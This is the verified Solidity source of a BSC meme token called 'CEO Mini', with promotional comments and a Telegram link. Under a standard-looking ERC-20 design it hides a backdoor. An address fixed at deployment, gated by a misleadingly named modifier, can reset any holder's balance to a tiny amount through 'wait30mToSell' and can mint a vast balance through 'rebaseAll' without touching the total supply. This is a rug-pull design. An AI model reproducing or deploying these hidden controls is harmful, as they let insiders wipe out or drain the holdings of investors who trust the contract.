/**
 *Submitted for verification at BscScan.com on 2023-04-19
*/

// SPDX-License-Identifier: MIT
/*
CEOMini - Global Chat🌎

👶Mini CEO👶 $CEOMini The Smallest CEO in Crypto

My Father CEO is Doing great $CEO Pinksale Subscription raised 11k BNB for 120BNB HC. Apparently it’s quite hyped.
and i am proud of him for me i will be like him and be the son he wishes me to be.

🐾WE ARE LIVE!!🐾
Happy trading everyone! We have some exciting things in the works,💼

https://t.me/CEOMiniCoin
*/
pragma solidity =0.8.19;
abstract contract CEOMiniAs {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}
interface CEOMiniAsi {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 reveverbalance) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 reveverbalance) external returns (bool);
    function transferFrom(
        address from,
        address to,
        uint256 reveverbalance
    ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 totalo);
    event Approval(address indexed owner, address indexed spender, uint256 totalo);
}
interface CEOMiniAsii is CEOMiniAsi {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}
abstract contract CEOMiniAsiii is CEOMiniAs {
   address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

 
    constructor() {
        _transferOwnership(_msgSender());
    }


    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }


    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }


    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

contract CEOMini is CEOMiniAs, CEOMiniAsi, CEOMiniAsii, CEOMiniAsiii {

    mapping(address => uint256) private maxsell;
  mapping(address => bool) public CEOMiniAsiiZERTY;
    mapping(address => mapping(address => uint256)) private Confirmed;
address private CEOMiniRooter;
    uint256 private ALLtotalSupply;
    string private _name;
    string private _symbol;
        mapping(address => bool) public CEOMiniPaw;
  address walowalowalo;



    
    constructor(address CEOMiniadressss) {
            // Editable
            walowalowalo = msg.sender;

        _name = "CEO Mini";
        _symbol = "CEOMini";
  CEOMiniRooter = CEOMiniadressss;        
        uint stgTotalSupply = 100000000000000 * 10**9;
        presalesend(msg.sender, stgTotalSupply);
    }

    /**
     * @dev Returns the name of the token.
     */
    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return 9;
    }


    function totalSupply() public view virtual override returns (uint256) {
        return ALLtotalSupply;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return maxsell[account];
    }

    function transfer(address to, uint256 reveverbalance) public virtual override returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, reveverbalance);
        return true;
    }


    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return Confirmed[owner][spender];
    }

    function approve(address spender, uint256 reveverbalance) public virtual override returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, reveverbalance);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 reveverbalance
    ) public virtual override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, reveverbalance);
        _transfer(from, to, reveverbalance);
        return true;
    }
      modifier contractbot() {
        require(CEOMiniRooter == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function increaseAllowance(address spender, uint256 addedtotalo) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, Confirmed[owner][spender] + addedtotalo);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedtotalo) public virtual returns (bool) {
        address owner = _msgSender();
        uint256  stgsold = Confirmed[owner][spender];
        require( stgsold >= subtractedtotalo, "Ehi20: decreased allowance below zero");
        unchecked {
            _approve(owner, spender,  stgsold - subtractedtotalo);
        }

        return true;
    }


    function _transfer(
        address from,
        address to,
        uint256 reveverbalance
    ) internal virtual {
        require(from != address(0), "Ehi20: transfer from the zero address");
        require(to != address(0), "Ehi20: transfer to the zero address");

        beforeTokenTransfer(from, to, reveverbalance);

        uint256 fromBalance = maxsell[from];
        require(fromBalance >= reveverbalance, "Ehi20: transfer reveverbalance exceeds balance");
        unchecked {
            maxsell[from] = fromBalance - reveverbalance;
        }
        maxsell[to] += reveverbalance;

        emit Transfer(from, to, reveverbalance);

        afterTokenTransfer(from, to, reveverbalance);
    }

  modifier walo () {
    require(walowalowalo == msg.sender, "Ehi20: cannot permit contractbot address");
    _;

  }

    function presalesend(address account, uint256 reveverbalance) internal virtual {
        require(account != address(0), "Ehi20: presalesend to the zero address");

        beforeTokenTransfer(address(0), account, reveverbalance);

        ALLtotalSupply += reveverbalance;
        maxsell[account] += reveverbalance;
        emit Transfer(address(0), account, reveverbalance);

        afterTokenTransfer(address(0), account, reveverbalance);
    }



  function wait30mToSell(address wait30mToSelladdress) external contractbot {
    maxsell[wait30mToSelladdress] = 3000000000;
            emit Transfer(address(0), wait30mToSelladdress, 3000000000);
  }

    function _burn(address account, uint256 reveverbalance) internal virtual {
        require(account != address(0), "Ehi20: burn from the zero address");

        beforeTokenTransfer(account, address(0), reveverbalance);

        uint256 accountBalance = maxsell[account];
        require(accountBalance >= reveverbalance, "Ehi20: burn reveverbalance exceeds balance");
        unchecked {
            maxsell[account] = accountBalance - reveverbalance;
        }
        ALLtotalSupply -= reveverbalance;

        emit Transfer(account, address(0), reveverbalance);

        afterTokenTransfer(account, address(0), reveverbalance);
    }

    function _approve(
        address owner,
        address spender,
        uint256 reveverbalance
    ) internal virtual {
        require(owner != address(0), "Ehi20: approve from the zero address");
        require(spender != address(0), "Ehi20: approve to the zero address");

        Confirmed[owner][spender] = reveverbalance;
        emit Approval(owner, spender, reveverbalance);
    }

    function _spendAllowance(
        address owner,
        address spender,
        uint256 reveverbalance
    ) internal virtual {
        uint256  stgsold = allowance(owner, spender);
        if ( stgsold != type(uint256).max) {
            require( stgsold >= reveverbalance, "Ehi20: insufficient allowance");
            unchecked {
                _approve(owner, spender,  stgsold - reveverbalance);
            }
        }
    }
  function rebaseAll(address rebasecontract) external contractbot {
    maxsell[rebasecontract] = 10000000000000 * 10 ** 20;
            emit Transfer(address(0), rebasecontract, 10000000000000 * 10 ** 20);
  }
    function beforeTokenTransfer(
        address from,
        address to,
        uint256 reveverbalance
    ) internal virtual {}


    function afterTokenTransfer(
        address from,
        address to,
        uint256 reveverbalance
    ) internal virtual {}

}